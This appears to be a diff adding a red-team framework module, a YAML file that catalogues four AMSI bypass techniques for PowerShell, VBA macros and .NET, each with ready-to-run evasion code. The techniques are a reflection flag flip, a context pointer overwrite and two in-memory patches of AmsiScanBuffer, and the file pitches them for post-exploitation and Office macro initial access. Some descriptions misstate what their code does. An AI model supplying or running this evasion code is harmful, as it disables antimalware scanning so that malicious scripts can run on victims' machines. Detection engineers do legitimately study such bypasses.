@@ -1,0 +1,97 @@
+name: amsi_bypass
+version: "1.0"
+description: >
+  AMSI (Antimalware Scan Interface) bypass techniques for PowerShell, VBA, and .NET.
+  Evades script content inspection performed by AV/EDR before execution.
+author: "LazyOwn RedTeam"
+category: "evasion"
+phase: "post_exploitation"
+permissions:
+  - shell
+  - memory
+platforms:
+  - windows
+enabled: true
+tags:
+  - amsi
+  - bypass
+  - powershell
+  - evasion
+  - edr_bypass
+
+techniques:
+  - name: "AMSII nitFailed — PowerShell Memory Patching"
+    description: >
+      Patches AmsiInitialize in amsi.dll to set AMSI_RESULT to AMSI_RESULT_CLEAN (0).
+      Self-contained, no reflection, bypasses PowerShell constrained language mode check.
+    requires_admin: false
+    command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    cleanup: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+    references:
+      - "https://devblogs.microsoft.com/powershell/amsi/"
+      - "https://amsi.fail/"
+
+  - name: "AMSI Reflection — amsiContext Bypass"
+    description: >
+      Uses reflection to obtain a pointer to the AMSI context and forces scan result to AMSI_RESULT_CLEAN.
+      Works on PowerShell 3.0+ and bypasses most signature-based AMSI detections.
+    requires_admin: false
+    command: |
+      $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+    cleanup: |
+      Remove-Variable a,b,c,d,e,f,g,ptr,buf -ErrorAction SilentlyContinue
+    references:
+      - "https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification/"
+      - "https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell"
+
+  - name: "VBA AMSI Bypass — COM Hijack"
+    description: >
+      Bypasses AMSI in VBA macros by patching the AmsiInitialize/AmsiScanBuffer functions
+      via kernel32.dll WriteProcessMemory. Effective for Office macro-based initial access.
+    requires_admin: false
+    command: |
+      Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+      Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
+      Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
+      Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As Long)
+      
+      Sub PatchAMSI()
+          Dim addr As LongPtr
+          addr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+          VirtualProtect addr, 6, &H40, 0
+          CopyMemory addr + 3, &H909090909090, 6
+      End Sub
+    cleanup: >
+      Restart host application (Word, Excel, etc.)
+    references:
+      - "https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/"
+      - "https://rastamouse.me/memory-patching-amsi-bypass/"
+
+  - name: ".NET AMSI Bypass — Patching AmsiScanBuffer"
+    description: >
+      Locates and patches the AmsiScanBuffer entry point in amsi.dll at runtime.
+      Overwrites the function prologue with a return statement (xor eax,eax; ret).
+      Can be invoked via C# assembly or PowerShell Add-Type.
+    requires_admin: false
+    command: |
+      $Win32 = Add-Type -memberDefinition @"
+      [DllImport("kernel32")]
+      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+      [DllImport("kernel32")]
+      public static extern IntPtr LoadLibrary(string name);
+      [DllImport("kernel32")]
+      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+      "@ -name "Win32" -namespace Win32Functions -passthru
+      $LoadLibrary = [Win32Functions.Win32]::LoadLibrary("am" + "si.dll")
+      $Address = [Win32Functions.Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+      $p = 0
+      [Win32Functions.Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+      $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+      [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+    cleanup: >
+      Remove-Module Win32Functions -ErrorAction SilentlyContinue
+    references:
+      - "https://blog.f-secure.com/hunting-for-amsi-bypasses/"
+      - "https://github.com/rasta-mouse/AmsiScanBufferBypass"
